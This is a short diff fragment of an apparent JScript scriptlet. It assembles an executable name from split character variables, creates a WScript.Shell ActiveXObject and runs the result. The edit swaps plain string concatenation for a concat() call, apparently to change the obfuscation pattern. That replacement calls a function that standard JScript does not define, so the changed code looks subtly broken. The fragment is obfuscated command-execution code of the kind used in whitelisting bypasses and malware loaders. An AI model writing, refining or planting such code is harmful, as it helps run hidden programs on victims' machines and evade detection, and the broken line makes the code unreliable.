@@ -21,7 +21,7 @@
 			var sum5='e';
 			var sum6='x';
 			var sum7='e';
-			var mon=sum+sum1+sum2+sum5+sum6+sum7;
+			var mon=concat(sum,sum1,sum2,sum5,sum6,sum7);
 			var r = new ActiveXObject("WScript.Shell");
 			r.Run(mon);
 		]]>
